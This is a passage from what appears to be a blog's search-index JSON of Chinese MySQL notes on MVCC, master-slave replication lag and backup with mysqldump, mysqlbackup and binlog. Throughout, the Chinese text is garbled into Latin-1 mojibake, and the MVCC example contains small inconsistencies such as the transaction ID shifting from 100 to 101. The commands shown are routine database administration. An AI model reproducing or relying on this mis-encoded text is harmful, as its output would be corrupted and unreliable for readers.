¹æ®äº‹ç‰©éš”ç¦»çº§åˆ«å»åˆ¤æ–­è¯»å–å“ªä¸ªç‰ˆæœ¬çš„æ•°æ®ã€‚ éš”ç¦»çº§åˆ«è§: /docs/æ•°æ®åº“/mysql/äº‹åŠ¡ æ•°æ®åº“éš”ç¦»çº§åˆ«è¯»å·²æäº¤ã€å¯é‡å¤è¯» éƒ½æ˜¯åŸºäºMVCCå®ç°çš„ï¼Œ ç›¸å¯¹äºåŠ é”ç®€å•ç²—æš´çš„æ–¹å¼ï¼Œå®ƒç”¨æ›´å¥½çš„æ–¹å¼å»å¤„ç†è¯»å†™å†²çªï¼Œèƒ½æœ‰æ•ˆæé«˜æ•°æ®åº“å¹¶å‘æ€§èƒ½ã€‚ äº‹åŠ¡ç‰ˆæœ¬å· äº‹åŠ¡æ¯æ¬¡å¼€å¯å‰ï¼Œéƒ½ä¼šä»æ•°æ®åº“è·å¾—ä¸€ä¸ªè‡ªå¢é•¿çš„äº‹åŠ¡IDï¼Œ å¯ä»¥ä»äº‹åŠ¡IDåˆ¤æ–­äº‹åŠ¡çš„æ‰§è¡Œå…ˆåé¡ºåºã€‚è¿™å°±æ˜¯äº‹åŠ¡ç‰ˆæœ¬å·ã€‚ éšå¼å­—æ®µ å¯¹äºInnoDBå­˜å‚¨å¼•æ“ï¼Œæ¯ä¸€è¡Œè®°å½•éƒ½æœ‰ä¸¤ä¸ªéšè—åˆ—trx_idã€roll_pointerï¼Œ å¦‚æœè¡¨ä¸­æ²¡æœ‰ä¸»é”®å’ŒéNULLå”¯ä¸€é”®æ—¶ï¼Œåˆ™è¿˜ä¼šæœ‰ç¬¬ä¸‰ä¸ªéšè—çš„ä¸»é”®åˆ—row_idã€‚ åˆ—å æ˜¯å¦å¿…é¡» æè¿° row_id å¦ å•è°ƒé€’å¢çš„è¡ŒIDï¼Œä¸æ˜¯å¿…éœ€çš„ï¼Œå ç”¨6ä¸ªå­—èŠ‚ trx_id æ˜¯ è®°å½•æ“ä½œè¯¥æ•°æ®äº‹åŠ¡çš„äº‹åŠ¡ID roll_pointer æ˜¯ è¿™ä¸ªéšè—åˆ—å°±ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å›æ»šæ®µçš„undoæ—¥å¿— undo log undo logï¼Œå›æ»šæ—¥å¿—ï¼Œç”¨äºè®°å½•æ•°æ®è¢«ä¿®æ”¹å‰çš„ä¿¡æ¯ã€‚ åœ¨è¡¨è®°å½•ä¿®æ”¹ä¹‹å‰ï¼Œä¼šå…ˆæŠŠæ•°æ®æ‹·è´åˆ°undo logé‡Œï¼Œ å¦‚æœäº‹åŠ¡å›æ»šï¼Œå³å¯ä»¥é€šè¿‡undo logæ¥è¿˜åŸæ•°æ®ã€‚ å¯ä»¥è¿™æ ·è®¤ä¸ºï¼Œå½“deleteä¸€æ¡è®°å½•æ—¶ï¼Œ undo log ä¸­ä¼šè®°å½•ä¸€æ¡å¯¹åº”çš„insertè®°å½•ï¼Œ å½“updateä¸€æ¡è®°å½•æ—¶ï¼Œå®ƒè®°å½•ä¸€æ¡å¯¹åº”ç›¸åçš„updateè®°å½•ã€‚ undo logæœ‰ä»€ä¹ˆç”¨é€”å‘¢ï¼Ÿ äº‹åŠ¡å›æ»šæ—¶ï¼Œä¿è¯åŸå­æ€§å’Œä¸€è‡´æ€§ã€‚ ç”¨äºMVCCå¿«ç…§è¯»ã€‚ ç‰ˆæœ¬é“¾ å¤šä¸ªäº‹åŠ¡å¹¶è¡Œæ“ä½œæŸä¸€è¡Œæ•°æ®æ—¶ï¼Œä¸åŒäº‹åŠ¡å¯¹è¯¥è¡Œæ•°æ®çš„ä¿®æ”¹ä¼šäº§ç”Ÿå¤šä¸ªç‰ˆæœ¬ï¼Œ ç„¶åé€šè¿‡å›æ»šæŒ‡é’ˆï¼ˆroll_pointerï¼‰ï¼Œè¿æˆä¸€ä¸ªé“¾è¡¨ï¼Œè¿™ä¸ªé“¾è¡¨å°±ç§°ä¸ºç‰ˆæœ¬é“¾ã€‚ å¦‚ä¸‹ï¼š å…¶å®ï¼Œé€šè¿‡ç‰ˆæœ¬é“¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºäº‹åŠ¡ç‰ˆæœ¬å·ã€è¡¨æ ¼éšè—çš„åˆ—å’Œundo logå®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚ æˆ‘ä»¬å†æ¥å°åˆ†æä¸€ä¸‹ã€‚ å‡è®¾ç°åœ¨æœ‰ä¸€å¼ core_userè¡¨ï¼Œè¡¨é‡Œé¢æœ‰ä¸€æ¡æ•°æ®,idä¸º1ï¼Œåå­—ä¸ºå­™æƒ ç°åœ¨å¼€å¯ä¸€ä¸ªäº‹åŠ¡A: å¯¹core_userè¡¨æ‰§è¡Œupdate core_user set name =\"æ›¹æ“\" where id=1,ä¼šè¿›è¡Œå¦‚ä¸‹æµç¨‹æ“ä½œ é¦–å…ˆè·å¾—ä¸€ä¸ªäº‹åŠ¡ID=100 æŠŠcore_userè¡¨ä¿®æ”¹å‰çš„æ•°æ®,æ‹·è´åˆ°undo log ä¿®æ”¹core_userè¡¨ä¸­ï¼Œid=1çš„æ•°æ®ï¼Œåå­—æ”¹ä¸ºæ›¹æ“ æŠŠä¿®æ”¹åçš„æ•°æ®äº‹åŠ¡Id=101æ”¹æˆå½“å‰äº‹åŠ¡ç‰ˆæœ¬å·ï¼Œå¹¶æŠŠroll_pointeræŒ‡å‘undo logæ•°æ®åœ°å€ã€‚ å¿«ç…§è¯»å’Œå½“å‰è¯» å¿«ç…§è¯» è¯»å–çš„æ˜¯è®°å½•æ•°æ®çš„å¯è§ç‰ˆæœ¬ï¼ˆæœ‰æ—§çš„ç‰ˆæœ¬ï¼‰ã€‚ ä¸åŠ é”,æ™®é€šçš„selectè¯­å¥éƒ½æ˜¯å¿«ç…§è¯», å¦‚: select * from core_user where id > 2; å½“å‰è¯» è¯»å–çš„æ˜¯è®°å½•æ•°æ®çš„æœ€æ–°ç‰ˆæœ¬ï¼Œ æ˜¾å¼åŠ é”çš„éƒ½æ˜¯å½“å‰è¯»: select * from core_user where id > 2 for update; select * from account where id>2 lock in share mode; Read View Read Viewæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å®ƒå°±æ˜¯äº‹åŠ¡æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œäº§ç”Ÿçš„è¯»è§†å›¾ã€‚ å®é™…ä¸Šåœ¨innodbä¸­ï¼Œæ¯ä¸ªSQLè¯­å¥æ‰§è¡Œå‰éƒ½ä¼šå¾—åˆ°ä¸€ä¸ªRead Viewã€‚ Read Viewæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ å®ƒä¸»è¦æ˜¯ç”¨æ¥åšå¯è§æ€§åˆ¤æ–­çš„ï¼Œå³åˆ¤æ–­å½“å‰äº‹åŠ¡å¯è§å“ªä¸ªç‰ˆæœ¬çš„æ•°æ® Read Viewæ˜¯å¦‚ä½•ä¿è¯å¯è§æ€§åˆ¤æ–­çš„å‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹çœ‹Read view çš„å‡ ä¸ªé‡è¦å±æ€§ m_ids å½“å‰ç³»ç»Ÿä¸­é‚£äº›æ´»è·ƒ(æœªæäº¤)çš„è¯»å†™äº‹åŠ¡ID, å®ƒæ•°æ®ç»“æ„ä¸ºä¸€ä¸ªListã€‚ min_limit_id è¡¨ç¤ºåœ¨ç”ŸæˆReadViewæ—¶ï¼Œå½“å‰ç³»ç»Ÿä¸­æ´»è·ƒçš„è¯»å†™äº‹åŠ¡ä¸­æœ€å°çš„äº‹åŠ¡idï¼Œå³m_idsä¸­çš„æœ€å°å€¼ã€‚ max_limit_id è¡¨ç¤ºç”ŸæˆReadViewæ—¶ï¼Œç³»ç»Ÿä¸­åº”è¯¥åˆ†é…ç»™ä¸‹ä¸€ä¸ªäº‹åŠ¡çš„idå€¼ã€‚ creator_trx_id åˆ›å»ºå½“å‰read viewçš„äº‹åŠ¡ID Read view åŒ¹é…æ¡ä»¶è§„åˆ™å¦‚ä¸‹ï¼š å¦‚æœæ•°æ®äº‹åŠ¡ID trx_id < min_limit_id ï¼Œè¡¨æ˜ç”Ÿæˆè¯¥ç‰ˆæœ¬çš„äº‹åŠ¡åœ¨ç”ŸæˆRead Viewå‰ï¼Œ å·²ç»æäº¤(å› ä¸ºäº‹åŠ¡IDæ˜¯é€’å¢çš„)ï¼Œæ‰€ä»¥è¯¥ç‰ˆæœ¬å¯ä»¥è¢«å½“å‰äº‹åŠ¡è®¿é—®ã€‚ å¦‚æœ trx_id >= max_limit_id ï¼Œè¡¨æ˜ç”Ÿæˆè¯¥ç‰ˆæœ¬çš„äº‹åŠ¡åœ¨ç”ŸæˆReadViewåæ‰ç”Ÿæˆï¼Œæ‰€ä»¥è¯¥ç‰ˆæœ¬ä¸å¯ä»¥è¢«å½“å‰äº‹åŠ¡è®¿é—®ã€‚ å¦‚æœ min_limit_id =<trx_id< max_limit_id , éœ€è…°åˆ†3ç§æƒ…å†µè®¨è®º å¦‚æœm_idsåŒ…å«trx_id,åˆ™ä»£è¡¨Read Viewç”Ÿæˆæ—¶åˆ»ï¼Œè¿™ä¸ªäº‹åŠ¡è¿˜æœªæäº¤ï¼Œ ä½†æ˜¯å¦‚æœæ•°æ®çš„trx_idç­‰äºcreator_trx_idçš„è¯ï¼Œè¡¨æ˜æ•°æ®æ˜¯è‡ªå·±ç”Ÿæˆçš„ï¼Œå› æ­¤æ˜¯å¯è§çš„ã€‚ å¦‚æœm_idsåŒ…å«trx_idï¼Œå¹¶ä¸”trx_idä¸ç­‰äºcreator_trx_idï¼Œåˆ™ Read Viewç”Ÿæˆæ—¶ï¼Œ äº‹åŠ¡æœªæäº¤ï¼Œå¹¶ä¸”ä¸æ˜¯è‡ªå·±ç”Ÿäº§çš„ï¼Œæ‰€ä»¥å½“å‰äº‹åŠ¡ä¹Ÿæ˜¯çœ‹ä¸è§çš„ï¼› å¦‚æœm_idsä¸åŒ…å«trx_idï¼Œåˆ™è¯´æ˜ä½ è¿™ä¸ªäº‹åŠ¡åœ¨Read Viewç”Ÿæˆä¹‹å‰å°±å·²ç»æäº¤äº†ï¼Œä¿®æ”¹çš„ç»“æœï¼Œå½“å‰äº‹åŠ¡æ˜¯èƒ½çœ‹è§çš„ã€‚ MVCCå®ç°åŸç†åˆ†æ æŸ¥è¯¢ä¸€æ¡è®°å½•ï¼ŒåŸºäºMVCCï¼Œæ˜¯æ€æ ·çš„æµç¨‹ è·å–äº‹åŠ¡è‡ªå·±çš„ç‰ˆæœ¬å·ï¼Œå³äº‹åŠ¡ID è·å–Read View æŸ¥è¯¢å¾—åˆ°çš„æ•°æ®ï¼Œç„¶åRead Viewä¸­çš„äº‹åŠ¡ç‰ˆæœ¬å·è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœä¸ç¬¦åˆRead Viewçš„å¯è§æ€§è§„åˆ™ï¼Œ å³å°±éœ€è¦Undo logä¸­å†å²å¿«ç…§; æœ€åè¿”å›ç¬¦åˆè§„åˆ™çš„æ•°æ® InnoDB å®ç°MVCCï¼Œæ˜¯é€šè¿‡ Read View + Undo Log å®ç°çš„ï¼Œ Undo Log ä¿å­˜äº†å†å²å¿«ç…§ï¼ŒRead Viewå¯è§æ€§è§„åˆ™å¸®åŠ©åˆ¤æ–­å½“å‰ç‰ˆæœ¬çš„æ•°æ®æ˜¯å¦å¯è§ã€‚ è¯»å·²æäº¤ï¼ˆRCï¼‰éš”ç¦»çº§åˆ«ï¼Œå­˜åœ¨ä¸å¯é‡å¤è¯»é—®é¢˜çš„åˆ†æå†ç¨‹ åˆ›å»ºcore_userè¡¨ï¼Œæ’å…¥ä¸€æ¡åˆå§‹åŒ–æ•°æ®,å¦‚ä¸‹ éš”ç¦»çº§åˆ«è®¾ç½®ä¸ºè¯»å·²æäº¤ï¼ˆRCï¼‰ï¼Œäº‹åŠ¡Aå’Œäº‹åŠ¡BåŒæ—¶å¯¹core_userè¡¨è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹æ“ä½œ: äº‹åŠ¡A: select * fom core_user where id=1 äº‹åŠ¡B: update core_user set name =\"æ›¹æ“\" æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š æœ€åäº‹åŠ¡AæŸ¥è¯¢åˆ°çš„ç»“æœæ˜¯ï¼Œname=æ›¹æ“çš„è®°å½•ï¼Œæˆ‘ä»¬åŸºäºMVCCï¼Œ æ¥åˆ†æä¸€ä¸‹æ‰§è¡Œæµç¨‹ï¼š Aå¼€å¯äº‹åŠ¡ï¼Œé¦–å…ˆå¾—åˆ°ä¸€ä¸ªäº‹åŠ¡IDä¸º100 Bå¼€å¯äº‹åŠ¡ï¼Œå¾—åˆ°äº‹åŠ¡IDä¸º101 äº‹åŠ¡Aç”Ÿæˆä¸€ä¸ªRead Viewï¼Œread viewå¯¹åº”çš„å€¼å¦‚ä¸‹ å˜é‡ å€¼ m_ids 100ï¼Œ101 max_limit_id 102 min_limit_id 100 creator_trx_id 100 ç„¶åå›åˆ°ç‰ˆæœ¬é“¾ï¼šå¼€å§‹ä»ç‰ˆæœ¬é“¾ä¸­æŒ‘é€‰å¯è§çš„è®°å½• ç”±å›¾å¯ä»¥çœ‹å‡ºï¼Œæœ€æ–°ç‰ˆæœ¬çš„åˆ—nameçš„å†…å®¹æ˜¯å­™æƒï¼Œ è¯¥ç‰ˆæœ¬çš„trx_idå€¼ä¸º100ã€‚å¼€å§‹æ‰§è¡Œread viewå¯è§æ€§è§„åˆ™æ ¡éªŒ: min_limit_id(100)=<trx_idï¼ˆ100ï¼‰<102; creator_trx_id = trx_id =100; ç”±æ­¤å¯å¾—ï¼Œtrx_id=100çš„è¿™ä¸ªè®°å½•ï¼Œå½“å‰äº‹åŠ¡æ˜¯å¯è§çš„ã€‚æ‰€ä»¥æŸ¥åˆ°æ˜¯nameä¸ºå­™æƒçš„è®°å½•ã€‚ äº‹åŠ¡Bè¿›è¡Œä¿®æ”¹æ“ä½œï¼ŒæŠŠåå­—æ”¹ä¸ºæ›¹æ“ã€‚ æŠŠåŸæ•°æ®æ‹·è´åˆ°undo log,ç„¶åå¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œ æ ‡è®°äº‹åŠ¡IDå’Œä¸Šä¸€ä¸ªæ•°æ®ç‰ˆæœ¬åœ¨undo logçš„åœ°å€ã€‚ æäº¤äº‹åŠ¡ äº‹åŠ¡Aå†æ¬¡æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œæ–°ç”Ÿæˆä¸€ä¸ªRead Viewï¼ŒRead Viewå¯¹åº”çš„å€¼å¦‚ä¸‹ å˜é‡ å€¼ m_ids 100 max_limit_id 102 min_limit_id 100 creator_trx_id 100 ç„¶åå†æ¬¡å›åˆ°ç‰ˆæœ¬é“¾ï¼šä»ç‰ˆæœ¬é“¾ä¸­æŒ‘é€‰å¯è§çš„è®°å½•ï¼š ä»å›¾å¯å¾—ï¼Œæœ€æ–°ç‰ˆæœ¬çš„åˆ—nameçš„å†…å®¹æ˜¯æ›¹æ“ï¼Œè¯¥ç‰ˆæœ¬çš„trx_idå€¼ä¸º101ã€‚å¼€å§‹æ‰§è¡ŒRead Viewå¯è§æ€§è§„åˆ™æ ¡éªŒ: min_limit_id(100)=<trx_idï¼ˆ101ï¼‰<max_limit_idï¼ˆ102); ä½†æ˜¯,trx_id=101ï¼Œä¸å±äºm_idsé›†åˆ å› æ­¤ï¼Œtrx_id=101è¿™ä¸ªè®°å½•ï¼Œå¯¹äºå½“å‰äº‹åŠ¡æ˜¯å¯è§çš„ã€‚æ‰€ä»¥SQLæŸ¥è¯¢åˆ°çš„æ˜¯nameä¸ºæ›¹æ“çš„è®°å½•ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œåœ¨è¯»å·²æäº¤ï¼ˆRCï¼‰éš”ç¦»çº§åˆ«ä¸‹ï¼ŒåŒä¸€ä¸ªäº‹åŠ¡é‡Œï¼Œä¸¤ä¸ªç›¸åŒçš„æŸ¥è¯¢ï¼Œè¯»å–åŒä¸€æ¡è®°å½•ï¼ˆid=1ï¼‰ï¼Œ å´è¿”å›äº†ä¸åŒçš„æ•°æ®ï¼ˆç¬¬ä¸€æ¬¡æŸ¥å‡ºæ¥æ˜¯å­™æƒï¼Œç¬¬äºŒæ¬¡æŸ¥å‡ºæ¥æ˜¯æ›¹æ“é‚£æ¡è®°å½•ï¼‰ï¼Œå› æ­¤RCéš”ç¦»çº§åˆ«ï¼Œå­˜åœ¨ä¸å¯é‡å¤è¯»å¹¶å‘é—®é¢˜ã€‚ å‚è€ƒ: https://juejin.cn/post/7016165148020703246","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-MVCC.html","loc":"/yq-doc-source-docs-database-mysql-MVCC.html"},{"title":"ä¸»ä»åŒæ­¥","text":"ç”¨å¤„: æ¯”å¦‚ä½¿ç”¨ ä¸»ä»æ¶æ„ (binlog) å®ç° è¯»å†™åˆ†ç¦» ä¸šåŠ¡ä»£ç å±‚é¢, è¯»å†™åˆ†ç¦»åªå…³æ³¨è·¯ç”±åˆ°è¯»çš„åº“, è¿˜æ˜¯å†™çš„åº“. å‡ºäº†ç‰©ç†ä¸Šçš„ä»åº“, è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–ç»„ä»¶ æ¯”å¦‚ ClickHouse ä¼ªè£…ä½œä¸ºä»åº“(è¿˜æ˜¯ç”¨çš„binlogçš„å½¢å¼å®ç°, å•æœºè¯»æ€§èƒ½å¼º), è¿˜æœ‰ Canal ä¸ MQ ç»“åˆ ä¸»ä»å¤åˆ¶åŸç† æµç¨‹ masteræ•°æ®å†™å…¥ï¼Œæ›´æ–°binlog masteråˆ›å»ºä¸€ä¸ªdumpçº¿ç¨‹å‘slaveæ¨é€binlog slaveè¿æ¥åˆ°masterçš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªIOçº¿ç¨‹æ¥æ”¶binlogï¼Œå¹¶è®°å½•åˆ° relay log(ä¸­ç»§æ—¥å¿—) ä¸­ slaveå†å¼€å¯ä¸€ä¸ªsq|çº¿ç¨‹è¯»å– relay log äº‹ä»¶å¹¶åœ¨slaveæ‰§è¡Œï¼Œå®ŒæˆåŒæ­¥ slaveè®°å½•è‡ªå·±çš„binglog ä¸»ä»åŒæ­¥å»¶è¿Ÿå¤„ç† ä¸»ä»åŒæ­¥å»¶è¿Ÿçš„åŸå›  å½“æ•°æ®åº“ä¸»åº“æœ‰è¾ƒå¤§æ›´æ–°å¹¶å‘æ“ä½œæ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸»ä»åŒæ­¥å»¶è¿Ÿï¼Œ å› ä¸ºä»åº“é‡Œé¢è¯»å– binlog çš„çº¿ç¨‹ä»…æœ‰ä¸€ä¸ªï¼Œ å½“æŸä¸ª SQL åœ¨ä»åº“ä¸Šæ‰§è¡Œçš„æ—¶é—´ç¨é•¿æˆ–è€…ç”±äºæŸä¸ªSQL è¦è¿›è¡Œé”è¡¨å°±ä¼šå¯¼è‡´ä¸»ä»åŒæ­¥å»¶è¿Ÿï¼Œ ä¸»åº“çš„SQLå¤§é‡ç§¯å‹ï¼Œæœªè¢«åŒæ­¥åˆ°ä»åº“é‡Œã€‚è¿™å°±å¯¼è‡´äº†ä¸»ä»ä¸ä¸€è‡´ï¼Œä¹Ÿå°±æ˜¯ä¸»ä»å»¶è¿Ÿã€‚ ä¸»ä»åŒæ­¥å»¶è¿Ÿçš„è§£å†³åŠæ³• è§£å†³ä¸»ä»å¤åˆ¶å»¶è¿Ÿæœ‰å‡ ç§å¸¸è§çš„æ–¹æ³•ï¼š å†™æ“ä½œåçš„è¯»æ“ä½œæŒ‡å®šå‘ç»™æ•°æ®åº“ä¸»åº“ ä¾‹å¦‚ï¼Œæ³¨å†Œè´¦å·å®Œæˆåï¼Œç™»å½•æ—¶è¯»å–è´¦å·çš„è¯»æ“ä½œä¹Ÿå‘ç»™æ•°æ®åº“ä¸»åº“ã€‚ è¿™ç§æ–¹å¼å’Œä¸šåŠ¡å¼ºç»‘å®šï¼Œå¯¹ä¸šåŠ¡çš„ä¾µå…¥å’Œå½±å“è¾ƒå¤§ï¼Œå¦‚æœå“ªä¸ªæ–°æ¥çš„ç¨‹åºå‘˜ä¸çŸ¥é“è¿™æ ·å†™ä»£ç ï¼Œå°±ä¼šå¯¼è‡´ä¸€ä¸ªbugã€‚ è¯»ä»åº“å¤±è´¥åå†è¯»ä¸€æ¬¡ä¸»åº“ è¿™å°±æ˜¯é€šå¸¸æ‰€è¯´çš„\"äºŒæ¬¡è¯»å–\"ï¼ŒäºŒæ¬¡è¯»å–å’Œä¸šåŠ¡æ— ç»‘å®šï¼Œåªéœ€è¦å¯¹åº•å±‚æ•°æ®åº“è®¿é—®çš„ API è¿›è¡Œå°è£…å³å¯ï¼Œ å®ç°ä»£ä»·è¾ƒå°ï¼Œä¸è¶³ä¹‹å¤„åœ¨äºå¦‚æœæœ‰å¾ˆå¤šäºŒæ¬¡è¯»å–ï¼Œå°†å¤§å¤§å¢åŠ ä¸»åº“çš„è¯»æ“ä½œå‹åŠ›ã€‚ ä¾‹å¦‚ï¼Œé»‘å®¢æš´åŠ›ç ´è§£è´¦å·ï¼Œä¼šå¯¼è‡´å¤§é‡çš„äºŒæ¬¡è¯»å–æ“ä½œï¼Œä¸»åº“å¯èƒ½é¡¶ä¸ä½è¯»æ“ä½œçš„å‹åŠ›ä»è€Œå´©æºƒã€‚ å…³é”®ä¸šåŠ¡è¯»å†™æ“ä½œå…¨éƒ¨æŒ‡å‘ä¸»åº“ï¼Œéå…³é”®ä¸šåŠ¡é‡‡ç”¨è¯»å†™åˆ†ç¦» ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ªç”¨æˆ·ç®¡ç†ç³»ç»Ÿæ¥è¯´ï¼Œæ³¨å†Œ+ç™»å½•çš„ä¸šåŠ¡è¯»å†™æ“ä½œå…¨éƒ¨è®¿é—®ä¸»åº“ï¼Œ ç”¨æˆ·çš„ä»‹ç»ã€çˆ±å¥½ã€ç­‰çº§ç­‰ä¸šåŠ¡ï¼Œå¯ä»¥é‡‡ç”¨è¯»å†™åˆ†ç¦»ï¼Œ å› ä¸ºå³ä½¿ç”¨æˆ·æ”¹äº†è‡ªå·±çš„è‡ªæˆ‘ä»‹ç»ï¼Œåœ¨æŸ¥è¯¢æ—¶å´çœ‹åˆ°äº†è‡ªæˆ‘ä»‹ç»è¿˜æ˜¯æ—§çš„ï¼Œä¸šåŠ¡å½±å“ä¸ä¸èƒ½ç™»å½•ç›¸æ¯”å°±å°å¾ˆå¤šï¼Œä¸šåŠ¡ä¸Šä¸€èˆ¬å¯ä»¥æ¥å—ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Master-and-Synchronous.html","loc":"/yq-doc-source-docs-database-mysql-Master-and-Synchronous.html"},{"title":"mysql å¤‡ä»½æ–¹æ¡ˆ","text":"å…¨é‡å¤‡ä»½ æ–¹æ¡ˆä¸€ï¼š sqlå®ç° sql è¯­å¥å®ç°: mysqldump --lock-all-tables --flush-logs --master-data=2 -u $username -p $password $database_name > $bak_file å‚æ•°è§£é‡Š --lock-all-tables å¯¹äºInnoDBå°†æ›¿æ¢ä¸º --single-transactionã€‚ è¯¥é€‰é¡¹åœ¨å¯¼å‡ºæ•°æ®ä¹‹å‰æäº¤ä¸€ä¸ª BEGIN SQLè¯­å¥ï¼Œ BEGIN ä¸ä¼šé˜»å¡ä»»ä½•åº”ç”¨ç¨‹åºä¸”èƒ½ä¿è¯å¯¼å‡ºæ—¶æ•°æ®åº“çš„ä¸€è‡´æ€§çŠ¶æ€ã€‚ å®ƒåªé€‚ç”¨äºäº‹åŠ¡è¡¨ï¼Œä¾‹å¦‚ InnoDB å’Œ BDBã€‚ æœ¬é€‰é¡¹å’Œ --lock-tables é€‰é¡¹æ˜¯äº’æ–¥çš„ï¼Œå› ä¸º LOCK TABLES ä¼šä½¿ä»»ä½•æŒ‚èµ·çš„äº‹åŠ¡éšå«æäº¤ã€‚ è¦æƒ³å¯¼å‡ºå¤§è¡¨çš„è¯ï¼Œåº”ç»“åˆä½¿ç”¨ --quick é€‰é¡¹ã€‚ --flush-logs ç»“æŸå½“å‰æ—¥å¿—ï¼Œç”Ÿæˆå¹¶ä½¿ç”¨æ–°æ—¥å¿—æ–‡ä»¶ --master-data --master-data=2 . è¯¥é€‰é¡¹å°†ä¼šåœ¨è¾“å‡ºSQLä¸­è®°å½•ä¸‹å®Œå…¨å¤‡ä»½åæ–°æ—¥å¿—æ–‡ä»¶çš„åç§°ï¼Œç”¨äºæ—¥åæ¢å¤æ—¶å‚è€ƒï¼Œ ä¾‹å¦‚è¾“å‡ºçš„å¤‡ä»½SQLæ–‡ä»¶ä¸­å«æœ‰: CHANGE MASTER TO MASTER_LOG_FILE='MySQL-bin.000002', MASTER_LOG_POS=106; --all-databases å¤‡ä»½æ‰€æœ‰æ•°æ®åº“ï¼Œå¤‡ä»½å•ä¸ªåº“ç›´æ¥è·Ÿåº“å --databases æŒ‡å®šå¤šä¸ªæ•°æ®åº“ --quick , -q è¯¥é€‰é¡¹åœ¨å¯¼å‡ºå¤§è¡¨æ—¶å¾ˆæœ‰ç”¨ï¼Œ å®ƒå¼ºåˆ¶ MySQLdump ä»æœåŠ¡å™¨æŸ¥è¯¢å–å¾—è®°å½•ç›´æ¥è¾“å‡ºè€Œä¸æ˜¯å–å¾—æ‰€æœ‰è®°å½•åå°†å®ƒä»¬ç¼“å­˜åˆ°å†…å­˜ä¸­ã€‚ --ignore-table å¿½ç•¥æŸä¸ªæ•°æ®è¡¨ï¼Œå¦‚ --ignore-table test.user å¿½ç•¥æ•°æ®åº“testé‡Œçš„userè¡¨ æ³¨è§£ å¯¹äºmysqldumpå¤‡ä»½çš„æ•°æ®, å¯ä»¥ç›´æ¥è¿›æ•°æ®åº“æ‰§è¡Œ: source bak.sql æ¢å¤ å‘½ä»¤å¤§å°å†™ä¸æ•æ„Ÿ, åº“åå¤§å°å†™æ•æ„Ÿ æ–¹æ¡ˆäºŒï¼š djangoè§’åº¦å®ç° å¤‡ä»½: python manage.py dumpdata $app >$bak_file æ¢å¤: python manage.py loaddata $bak_file æ–¹æ¡ˆä¸‰ï¼š oracleå•†ä¸šè½¯ä»¶mysqlbackupå®ç°ï¼ˆå¯èƒ½éœ€ä»˜è´¹ä¸‹è½½ï¼‰ å®Œæ•´å¤‡ä»½: mysqlbackup --defaults-file=$mysqld_cnf_file --socket=$socket_file --with-timestamp --user=$user --password=$password --backup-dir=$backup_dir backup-and-apply-log --defaults-file mysqlé…ç½®æ–‡ä»¶ç›®å½• --socket socketç›®å½• ï¼ˆé»˜è®¤ä¸ç”¨è¾“å…¥ï¼Œä¸€èˆ¬ä¼šæ‰¾é»˜è®¤çš„ï¼‰ --with-timestamp ä»¥æ—¶é—´æ¥ç”Ÿæˆæ–‡ä»¶å --user ç”¨æˆ· --password å¯†ç  --backup-dir å¤‡ä»½æ–‡ä»¶ç›®å½• backup-and-apply-log å¤‡ä»½å¹¶æ£€æŸ¥æ—¥å¿—æ–‡ä»¶ å®Œæ•´å¤‡ä»½æ¢å¤: # copy-back æŠŠback-dirå¤åˆ¶åˆ°datadirä¸­ mysqlbackup --defaults-file=$mysqld_cnf_file --datadir=$sys_mysql_data_dir --backup-dir=$backup_dir copy-back --datadir å½“å‰æ•°æ®åº“ç›¸åº”çš„æ•°æ®æ–‡ä»¶æ‰€åœ¨ä½ç½® --backup-dir å½“å‰å¤‡ä»½æ–‡ä»¶æ‰€åœ¨ç›®å½• copy-back æŠŠback-dirå¤åˆ¶åˆ°datadirä¸­ æ³¨è§£ åœ¨æ¢å¤æ—¶æŠ¥é”™æœªæ‰¾åˆ°innodbé…ç½®ï¼Œä¸¤ç§æ–¹æ³•è§£å†³ï¼Œ ç¬¬ä¸€ç§åœ¨mysqld.cnfæ·»åŠ innodbçš„é…ç½®æ–‡ä»¶ï¼Œå…·ä½“é…ç½®åœ¨å¤‡ä»½æ–‡ä»¶backup-my.cnfä¸­ï¼Œ ç¬¬äºŒç§æ–¹æ³•ç›´æ¥å°† --defaults-fileæŒ‡å®šåˆ°å¤‡ä»½æ–‡ä»¶çš„backup-my.cnfç›®å½• åœ¨è¿˜åŸåï¼Œä¿®æ”¹mysqlè¿™ä¸ªç›®å½•å’Œmysqlé‡Œé¢çš„æ–‡ä»¶å†…å®¹éƒ½æŠŠæƒé™ä¿®æ”¹æˆmysql,å¦mysqlæ— æ³•å¯åŠ¨ å¢é‡å¤‡ä»½ æ–¹æ¡ˆä¸€ï¼š bin-log å¢é‡å¤‡ä»½ å¤‡ä»½å¤§æ¦‚é¡ºåº ç¡®è®¤æ•°æ®åº“å¼€å¯ log_bin é“¾æ¥æ•°æ®åº“åˆ·æ–°æ—¥å¿—ï¼Œæ‰§è¡Œ flush-logs å¤‡ä»½æ—§çš„ bin-log æ–‡ä»¶ æ¢å¤å¤‡ä»½å¤§æ¦‚é¡ºåº è¿˜åŸæ—§çš„ bin-log æ–‡ä»¶ æ‰§è¡Œmysqlbinlog æ¢å¤ï¼Œ å¦‚: mysqlbinlog --no-defaults $log_bin_file æ³¨è§£ è‹¥éœ€å®šæ—¶æ“ä½œï¼Œlinuxå¯åŠ crontabå®šæ—¶å™¨ æ–¹æ¡ˆäºŒï¼šmysqlbackupå®ç° 